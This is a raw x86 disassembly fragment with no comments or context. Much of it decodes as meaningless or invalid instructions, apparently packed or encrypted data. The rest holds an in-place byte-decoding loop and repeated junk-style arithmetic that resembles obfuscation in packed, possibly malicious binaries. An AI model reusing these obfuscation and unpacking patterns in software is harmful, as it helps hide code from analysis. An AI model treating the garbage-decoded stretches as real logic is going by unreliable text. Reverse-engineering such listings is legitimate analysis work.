  416467:	pop    ecx
  416468:	mov    ecx,0x3b2e5cc5
  41646d:	(bad)  
  41646e:	(bad)  [ecx+0x70]
  416471:	mov    edi,0x85fd0748
  416476:	icebp  
  416477:	cs popf 
  416479:	fwait
  41647a:	and    BYTE PTR [edi-0x61],0x53
  41647e:	int    0xc3
  416480:	dec    eax
  416481:	pop    ecx
  416482:	mov    edx,0x51c6fea5
  416487:	push   edx
  416488:	pop    edi
  416489:	xchg   edi,eax
  41648a:	cmp    DWORD PTR [ebx-0x6e9ed3e6],edx
  416490:	xchg   esp,eax
  416491:	mov    cl,0xb
  416493:	aad    0x29
  416495:	scas   al,BYTE PTR es:[edi]
  416496:	adc    edi,DWORD PTR [ebx+0x61]
  416499:	or     bl,bh
  41649b:	and    BYTE PTR fs:[ebp-0x70ce88b5],0xca
  4164a3:	test   al,0xd3
  4164a5:	ja     0x4164ca
  4164a7:	sbb    edi,DWORD PTR ss:[ecx-0x2cf081ff]
  4164ae:	jae    0x4164fd
  4164b0:	shr    DWORD PTR [edi-0x7c],0xf7
  4164b4:	sbb    al,dl
  4164b6:	pop    es
  4164b7:	xchg   edx,eax
  4164b8:	test   al,0x4e
  4164ba:	leave  
  4164bb:	rol    DWORD PTR [eax],cl
  4164bd:	ins    DWORD PTR es:[edi],dx
  4164be:	pop    edi
  4164bf:	out    0xfa,al
  4164c1:	and    esi,esi
  4164c3:	loope  0x4164fe
  4164c5:	pmovmskb edx,mm0
  4164c8:	pop    ecx
  4164c9:	pushf  
  4164ca:	ins    BYTE PTR es:[edi],dx
  4164cb:	ja     0x41647d
  4164cd:	and    bh,BYTE PTR [ebp-0x7bfc5610]
  4164d3:	lods   al,BYTE PTR ds:[esi]
  4164d4:	mov    WORD PTR [eax],?
  4164d6:	js     0x4164f8
  4164d8:	cmc    
  4164d9:	sbb    BYTE PTR [esi*2+0x1f231f2b],ah
  4164e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164e1:	cmp    bl,BYTE PTR [edi]
  4164e3:	icebp  
  4164e4:	(bad)  
  4164e5:	rcl    DWORD PTR [edi+0x6e],1
  4164e8:	jg     0x4164e6
  4164ea:	sbb    BYTE PTR [edi],dh
  4164ec:	add    ebx,esi
  4164ee:	jnp    0x416535
  4164f0:	mov    esi,0xf8823d5
  4164f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164f6:	(bad)  
  4164f8:	and    DWORD PTR [ecx],ebp
  4164fa:	ins    BYTE PTR es:[edi],dx
  4164fb:	rol    DWORD PTR [edi],cl
  4164fd:	jbe    0x41648d
  4164ff:	sbb    eax,0x608f37e6
  416504:	loope  0x41648a
  416506:	pushf  
  416507:	pop    ecx
  416508:	pop    edx
  416509:	or     al,BYTE PTR [eax-0x36]
  41650c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41650d:	dec    esp
  41650e:	lock jg 0x416571
  416511:	add    al,0x5a
  416513:	inc    ebp
  416514:	mov    edi,0xb3c758a
  416519:	call   0x8bab:0x7ca7ceef
  416520:	call   0x1431b5af
  416525:	xor    esp,ebx
  416527:	push   ds
  416528:	inc    ecx
  416529:	repz std 
  41652b:	inc    esp
  41652c:	jl     0x41659f
  41652e:	push   ds
  41652f:	int    0xd7
  416531:	fiadd  WORD PTR [eax-0x253000a]
  416537:	pop    es
  416538:	mov    ah,BYTE PTR [edx+0xc]
  41653b:	adc    eax,0x5f096f48
  416540:	arpl   bp,si
  416542:	dec    esp
  416543:	out    dx,eax
  416544:	loopne 0x416504
  416546:	enter  0x8362,0x6f
  41654a:	(bad)  
  41654b:	pop    ss
  41654c:	xor    BYTE PTR [ebx-0x435fff7],al
  416552:	call   0xbcba:0xb9653bd2
  416559:	retf   0x3d67
  41655c:	(bad)  
  41655d:	rdpmc  
  41655f:	mov    ecx,0xc80b02e8
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x422598
  416605:	mov    edi,0x4224de
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x422598
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp+0x7f070670]
  416729:	mov    al,0x77
  41672b:	cld    
  41672c:	push   ss
  41672d:	sbb    BYTE PTR [ebx+0x9181814],bl
  416733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416734:	mov    ecx,0x4fce5e2f
  416739:	lds    edx,FWORD PTR [eax-0x4ee704d]
  41673f:	mov    DWORD PTR [eax-0x7],0x6c664c8d
  416746:	xchg   cl,dh
  416748:	imul   ebp,DWORD PTR [eax],0xffffffc9
  41674b:	(bad)  
  41674c:	fs pop esi
  41674e:	test   eax,0x85fcb431
  416753:	inc    ecx
  416754:	or     DWORD PTR [ebx+0x41e833b7],ebx
  41675a:	push   ecx
  41675b:	pop    es
  41675c:	pop    ebp
  41675d:	loopne 0x416734
  41675f:	mov    dh,0x5a
  416761:	and    DWORD PTR [ebp+0x43e865b9],ecx
  416767:	movzx  eax,cx
  41676a:	dec    edi
  41676b:	jbe    0x416791
  41676d:	or     DWORD PTR [eax+0xfb9f778],eax
  416773:	mov    ecx,0xf533643
  416778:	ffree  st(4)
  41677a:	retf   0x6264
  41677d:	push   0x3c
  41677f:	xlat   BYTE PTR ds:[ebx]
  416780:	lds    ebx,FWORD PTR [esi]
  416782:	mov    ebp,0x4c2044a0
  416787:	ret    
  416788:	mov    esp,0xa61d840
  41678d:	sbb    al,0xed
  41678f:	out    dx,al
  416790:	mov    dl,0xb7
  416792:	adc    al,0x10
  416794:	push   ebx
  416795:	jno    0x4167a2
  416797:	mov    DWORD PTR [eax+ebp*4],esp
  41679a:	(bad)  
  41679b:	sahf   
  41679c:	or     BYTE PTR [esi],dh
  41679e:	sbb    DWORD PTR [edi-0x74907ca1],ebx
  4167a4:	shr    ebp,0x97
  4167a7:	xor    al,0x5c
  4167a9:	div    BYTE PTR [esi-0x66]
  4167ac:	lds    ecx,FWORD PTR [eax]
  4167ae:	xchg   DWORD PTR es:[ebx+0x25],ecx
  4167b2:	cli    
  4167b3:	inc    eax
  4167b4:	mov    dl,0x6c
  4167b6:	and    al,0xa5
  4167b8:	cwde   
  4167b9:	out    dx,eax
  4167ba:	push   ecx
  4167bb:	jne    0x41677c
  4167bd:	ds mov tr1,esp
  4167c1:	(bad)  
  4167c2:	sub    al,0x17
  4167c4:	and    edx,DWORD PTR [esi-0x4ddbcfec]
  4167ca:	xor    al,0x81
  4167cc:	xchg   bl,dh
  4167ce:	push   edi
  4167cf:	jns    0x416837
  4167d1:	repz sbb ebx,ebp
  4167d4:	(bad)  
  4167d5:	xchg   esp,eax
  4167d6:	mov    ah,0xe3
  4167d8:	in     al,0x55
  4167da:	bound  edx,QWORD PTR [edi+edx*8]
  4167dd:	pop    edi
  4167de:	test   eax,0xae9652f8
  4167e3:	retf   
  4167e4:	xor    ah,BYTE PTR [edi+0x7d]
  4167e7:	xor    al,0x11
  4167e9:	mov    esi,0x5fbd460b
  4167ee:	ret    0x5513
  4167f1:	mov    bh,0x9d
  4167f3:	arpl   ax,si
  4167f5:	dec    ebp
  4167f6:	mov    edx,0xf10359d4
  4167fb:	pop    ds
  4167fc:	(bad)
  416800:	pop    eax
  416801:	sub    eax,0x3b30e01f
  416806:	adc    esp,DWORD PTR [ebx-0x507a29f2]
  41680c:	nop
  41680d:	int3   
  41680e:	mov    bl,bh
  416810:	fwait
  416811:	test   ch,ah
  416813:	aad    0x0
  416815:	add    al,0xdb
  416817:	xor    ecx,DWORD PTR [eax]
  416819:	fldenv [ecx]
  41681b:	jmp    0x3954ef97
  416820:	sub    ch,BYTE PTR [edi]
  416822:	adc    eax,DWORD PTR [esp+eax*1-0x2a9ed35c]
  416829:	pop    ss
  41682a:	fwait
  41682b:	adc    ebx,DWORD PTR [ecx]
  41682d:	ja     0x4168a8
  41682f:	mov    ds:0x2902bcd,al
  416834:	(bad)
  416837:	outs   dx,BYTE PTR ds:[esi]
  416838:	mul    DWORD PTR [edi-0x3e76b5c7]
  41683e:	imul   ecx,DWORD PTR [edx],0x26283b6e
  416844:	pop    ebp
  416845:	xchg   edi,eax
  416846:	add    DWORD PTR [esi+0x7af8f6f4],0xb329008c
  416850:	into   
  416851:	lock aad 0xd7
  416854:	sbb    al,0xd3
  416856:	jne    0x4168cf
  416858:	jno    0x4167f3
  41685a:	pop    ebx
  41685b:	data16 (bad) 
  41685d:	cdq    
  41685e:	popf   
  41685f:	xchg   ecx,eax
  416860:	push   esi
  416861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416862:	lods   al,BYTE PTR ds:[esi]
  416863:	js     0x4168be
  416865:	ds gs retf 0xfad4
  41686a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41686b:	inc    esp
  41686c:	xchg   esp,eax
  41686d:	call   0x99a5fd2
  416872:	push   eax
  416873:	sub    BYTE PTR [esi],al
  416875:	(bad)  
  416876:	jnp    0x41689d
  416878:	xor    dh,dl
  41687a:	lock les eax,FWORD PTR [edx-0x20]
  41687e:	jb     0x4168c8
  416880:	jge    0x4168e1
  416882:	nop
  416883:	or     eax,0xa94b9e2d
  416888:	mov    bh,0x45
  41688a:	adc    eax,0x626a29ff
  41688f:	daa    
  416890:	cwde   
  416891:	sahf   
  416892:	pop    edi
  416893:	dec    edi
  416894:	pop    esp
  416895:	(bad)  
  416896:	stc    
  416897:	fisttp QWORD PTR [eax+0x2dde2bfd]
  41689d:	add    BYTE PTR [ecx],dh
  41689f:	jb     0x416913
  4168a1:	ret    0x1b34
  4168a4:	dec    ebx
  4168a5:	add    al,0x5d
  4168a7:	mov    ch,0xe1
  4168a9:	mov    esi,0x88c337af
  4168ae:	cmp    eax,0x955dcbcd
  4168b3:	jmp    0xaf54e65b
  4168b8:	lahf   
  4168b9:	rcr    DWORD PTR [edi+0x70],0x6b
  4168bd:	std    
  4168be:	les    edx,FWORD PTR [edx+ecx*2]
  4168c1:	loopne 0x41693f
  4168c3:	imul   ebx,DWORD PTR [ecx+0x6949611],0x1cfcb512
  4168cd:	aas    
  4168ce:	(bad)  
  4168cf:	pop    edi
  4168d0:	pop    ebp
  4168d1:	inc    ebx
  4168d2:	mov    edi,0xd0a2c76f
  4168d7:	xchg   BYTE PTR [edx],dh
  4168d9:	jmp    0x7d746567
  4168de:	mov    BYTE PTR [ecx],al
  4168e0:	xchg   DWORD PTR [ecx+ebp*4+0x35],edi
  4168e4:	retf   0x3c10
  4168e7:	or     eax,DWORD PTR [ebx+0x9]
  4168ea:	(bad)  
  4168eb:	in     eax,0xd9
  4168ed:	inc    esi
  4168ee:	sub    al,0x9d
  4168f0:	cmp    al,0xdc
  4168f2:	jns    0x41688a
  4168f4:	pop    ss
  4168f5:	sar    BYTE PTR [eax],cl
  4168f7:	loop   0x416946
  4168f9:	pop    edx
  4168fa:	sbb    al,0x6f
  4168fc:	repnz imul esp,ebp,0x8cf76df1
  416903:	arpl   WORD PTR [esi+0x1b8534d],di
  416909:	mov    esp,0xeaab51bb
  41690e:	repz cdq 
  416910:	int3   
  416911:	in     al,0x23
  416913:	mov    bh,0xfe
  416915:	out    dx,eax
  416916:	ds ins BYTE PTR es:[edi],dx
  416918:	inc    edi
  416919:	and    al,0x6a
  41691b:	sbb    ebx,DWORD PTR [ebx-0x30]
  41691e:	add    eax,0xbae081f3
  416923:	xchg   ebx,eax
  416924:	sahf   
  416925:	(bad)  
  416927:	dec    eax
  416928:	adc    ebp,DWORD PTR [ebx]
  41692a:	xchg   esi,eax
  41692b:	bound  esi,QWORD PTR [edx+0x45]
  41692e:	icebp  
  41692f:	jl     0x4169a2
  416931:	or     DWORD PTR [ecx+ebp*4],ecx
  416934:	jmp    0x4168c3
  416936:	test   DWORD PTR fs:[bx+di],ebx
  41693a:	dec    esi
  41693b:	jmp    0xde677b60
  416940:	sub    al,0xe9
  416942:	call   0x9ac7294d
  416947:	fadd   QWORD PTR [esp+ebp*4-0x2eec2fb9]
  41694e:	add    al,0x21
  416950:	cld    
  416951:	push   ds
  416952:	ja     0x41698b
  416954:	shr    DWORD PTR ds:0x5966cf5,0xd1
  41695b:	mov    dl,0x8
  41695d:	xor    ebp,edi
  41695f:	dec    ebp
  416960:	out    dx,eax
  416961:	in     al,dx
  416962:	or     bl,BYTE PTR [edx-0x339b86d0]
  416968:	in     eax,0x20
  41696a:	lds    ebx,FWORD PTR [edi-0x4db9cff]
  416970:	loope  0x416958
  416972:	daa    
  416973:	mov    esp,0xfe458d9a
  416978:	push   eax
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0xb0ad73e7
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx-0x77e7e7ec],bl
  4169ac:	je     0x416a08
  4169ae:	xor    esp,edx
  4169b0:	push   ds
  4169b1:	cmp    edi,DWORD PTR [ebp-0x6b]
  4169b4:	xchg   BYTE PTR [ebp-0x22],al
  4169b7:	mov    WORD PTR [ebx],fs
  4169b9:	xor    al,0x6b
  4169bb:	mov    edx,DWORD PTR [ecx-0x315d595c]
  4169c1:	xchg   ecx,eax
  4169c2:	ret    0xc547
  4169c5:	test   eax,0x872e52cb
  4169ca:	and    edi,esp
  4169cc:	call   eax
  4169ce:	add    ah,BYTE PTR [edx-0x41]
  4169d1:	add    DWORD PTR [ebx+0x54262ebe],eax
  4169d7:	sub    al,BYTE PTR ds:0xf0687824
  4169dd:	sbb    eax,0x3c242b83
  4169e2:	mov    al,0x31
  4169e4:	xor    esi,eax
  4169e6:	push   0xe13a132f
  4169eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169ec:	popf   
  4169ed:	test   eax,0xe1e33745
  4169f2:	mov    ch,ch
  4169f4:	and    BYTE PTR [esi+0x5dcca291],al
  4169fa:	fisub  DWORD PTR [edi-0x34]
  4169fd:	jg     0x4169a1
  4169ff:	ret    0xe720
  416a02:	hlt    
  416a03:	scas   al,BYTE PTR es:[edi]
  416a04:	xchg   ecx,eax
  416a05:	and    bl,ah
  416a07:	dec    eax
  416a08:	add    DWORD PTR [ebx],edi
  416a0a:	rol    DWORD PTR [ebx],0xd8
  416a0d:	mov    edx,0xd4620b9b
  416a12:	push   edi
  416a13:	imul   BYTE PTR [ebx-0xf]
  416a16:	aaa    
  416a17:	retf   
  416a18:	inc    edi
  416a19:	xchg   ebp,eax
  416a1a:	xchg   esp,eax
  416a1b:	sbb    edi,esi
  416a1d:	aas    
  416a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a1f:	adc    BYTE PTR [ebx+edx*4+0x70],ch
  416a23:	add    eax,0xaee864b7
  416a28:	lods   al,BYTE PTR ds:[esi]
  416a29:	jmp    0xc1f8:0x64bab009
  416a30:	out    dx,eax
  416a31:	fld    DWORD PTR [esi+0x461ab417]
  416a37:	aam    0xca
  416a39:	cmp    eax,0xaa338525
  416a3e:	add    esi,DWORD PTR [edx]
  416a40:	adc    eax,0xacf0cf88
  416a45:	mov    bh,0x23
  416a47:	jl     0x416a42
  416a49:	imul   edi,DWORD PTR [ebx],0x56
  416a4c:	pop    edi
  416a4d:	cmp    eax,0x47a6c005
  416a52:	out    0x1a,al
  416a54:	inc    ecx
  416a55:	cmp    al,BYTE PTR [ecx+0x71]
  416a58:	in     eax,dx
  416a59:	add    BYTE PTR [ecx+0x7f],bl
  416a5c:	arpl   WORD PTR ds:0x67b6ef9b,si
  416a62:	pop    es
  416a63:	aaa    
  416a64:	xlat   BYTE PTR ds:[ebx]
  416a65:	retf   0x119b
  416a68:	inc    esi
  416a69:	shr    dl,0x40
  416a6c:	call   0x65ebb97d
  416a71:	bound  ebx,QWORD PTR [eax]
  416a73:	xchg   esp,eax
  416a74:	sbb    eax,0xc4f146c4
  416a79:	dec    esi
  416a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a7b:	and    BYTE PTR [edx-0x5d503d37],al
  416a81:	add    al,0x80
  416a83:	mov    edi,esp
  416a85:	xor    dl,bl
  416a87:	outs   dx,DWORD PTR ds:[esi]
  416a88:	push   edi
  416a89:	pop    ecx
  416a8a:	int    0xa3
  416a8c:	dec    ebp
  416a8d:	es int 0x65
  416a90:	aad    0x38
  416a92:	out    dx,al
  416a93:	ret    0x1326
  416a96:	jg     0x416aad
  416a98:	xor    DWORD PTR [ecx],esi
  416a9a:	sbb    dh,bl
  416a9c:	and    DWORD PTR [edx-0x4d06537],0x8368afd1
  416aa6:	iret   
  416aa7:	in     eax,0x35
  416aa9:	xlat   BYTE PTR ds:[ebx]
  416aaa:	mov    dl,0xd7
  416aac:	jne    0x416aed
  416aae:	popf   
  416aaf:	push   eax
  416ab0:	rcr    bl,cl
  416ab2:	mov    al,ds:0xc1552c33
  416ab7:	outs   dx,DWORD PTR ds:[esi]
  416ab8:	jecxz  0x416a97
  416aba:	ja     0x416a6d
  416abc:	cli    
  416abd:	imul   ebp,DWORD PTR [esi],0xcac1367
  416ac3:	test   al,0xd9
  416ac5:	mov    dl,0x16
  416ac7:	add    ecx,DWORD PTR [edi+0x20]
  416aca:	cmp    al,0xc
  416acc:	sub    eax,0x6698a453
  416ad1:	dec    ebx
  416ad2:	jecxz  0x416b26
  416ad4:	fimul  DWORD PTR [edx]
  416ad6:	daa    
  416ad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ad9:	call   0xec95:0x94213e5a
  416ae0:	mov    ds:0x83c6a5b6,eax
  416ae5:	lahf   
  416ae6:	inc    eax
  416ae7:	sbb    eax,0x4a900d57
  416aec:	mov    ?,edi
  416aee:	es inc ebp
  416af0:	lock call 0xd6ceb002
  416af6:	or     eax,0x7ed2035c
  416afb:	pop    ebp
  416afc:	xchg   ebp,eax
  416afd:	jle    0x416b7b
  416aff:	or     esp,eax
  416b01:	or     dl,ch
  416b03:	(bad)  
  416b04:	ror    BYTE PTR [esi],1
  416b06:	or     dh,al
  416b08:	jle    0x416b32
  416b0a:	in     al,dx
  416b0b:	(bad)
  416b0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b11:	sub    edx,DWORD PTR [eax+0x19]
  416b14:	xlat   BYTE PTR ds:[ebx]
  416b15:	rcr    BYTE PTR [ebp-0x80],0x15
  416b19:	mov    ecx,0x15ebb95b
  416b1e:	pop    ebp
  416b1f:	rol    DWORD PTR [eax+ebx*2-0x1],cl
  416b23:	and    ch,BYTE PTR [ebx+eiz*1+0x50]
  416b27:	add    ebx,DWORD PTR [esi+0x23d57432]
  416b2d:	out    0x88,eax
  416b2f:	sbb    al,0xbc
  416b31:	pop    edx
  416b32:	fstp   QWORD PTR [eax+0x545a2568]
  416b38:	sbb    al,0x49
  416b3a:	cmp    al,0x70
  416b3c:	cmp    BYTE PTR [edx-0x5b5a526],cl
  416b42:	push   eax
  416b43:	dec    ecx
  416b44:	in     al,dx
  416b45:	fs mov dl,0xe2
  416b48:	push   0x0
  416b4a:	jp     0x416aef
  416b4c:	pop    esp
  416b4d:	popa   
  416b4e:	lock loop 0x416b24
  416b51:	lahf   
  416b52:	pop    esi
  416b53:	pop    esp
  416b54:	psubw  mm2,QWORD PTR [esi-0x21]
  416b58:	add    al,0xff
  416b5a:	sub    DWORD PTR ds:0xea5a376d,0x4db389c0
  416b64:	test   DWORD PTR [ebx+0x27],0x48d16575
  416b6b:	mov    dh,0x6e
  416b6d:	adc    bl,BYTE PTR [ebx]
  416b6f:	iret   
  416b70:	push   eax
  416b71:	loope  0x416b91
  416b73:	test   eax,0x90e918df
  416b78:	add    BYTE PTR [ebp+0x6],al
  416b7b:	call   0xed6e5749
  416b80:	je     0x416be4
  416b82:	imul   ebp,DWORD PTR [ebx-0x31957f33],0x900395a4
  416b8c:	mov    ecx,DWORD PTR [edx+0x30ed5282]
  416b92:	gs add eax,0x4fe3e258
  416b98:	rcr    dl,0x7
  416b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b9c:	jl     0x416bb9
  416b9e:	xor    eax,0x2d16b2b5
  416ba3:	xor    al,0x90
  416ba5:	sahf   
  416ba6:	rol    BYTE PTR ds:0x989957,1
  416bac:	cli    
  416bad:	push   ax
  416baf:	(bad)  
  416bb0:	mov    cl,0xfe
  416bb2:	shl    BYTE PTR [eax-0x493726fd],1
  416bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bb9:	sub    eax,0x1cf03fb5
  416bbe:	pushf  
  416bbf:	cmp    eax,0x917033de
  416bc4:	mov    gs,WORD PTR [edi+0x5483ac50]
  416bca:	add    DWORD PTR [ecx+0x489e30d5],ecx
  416bd0:	ja     0x416c3a
  416bd2:	inc    ecx
  416bd3:	push   edi
  416bd4:	xlat   BYTE PTR ds:[ebx]
  416bd5:	lock les esp,FWORD PTR [eax+ebx*8-0x4deffae9]
  416bdd:	out    dx,eax
  416bde:	pop    esi
  416bdf:	hlt    
  416be0:	mov    dh,0xe9
  416be2:	bswap  ebp
  416be4:	add    eax,DWORD PTR [ebp+0x371d8c4d]
  416bea:	cdq    
  416beb:	xor    BYTE PTR [ecx-0x6d],ah
  416bee:	xor    edx,edx
  416bf0:	or     eax,edx
  416bf2:	add    eax,edi
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42825f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x42838b,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x42823b,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x4282b3,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x428313,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x4281fb
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x42823f,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
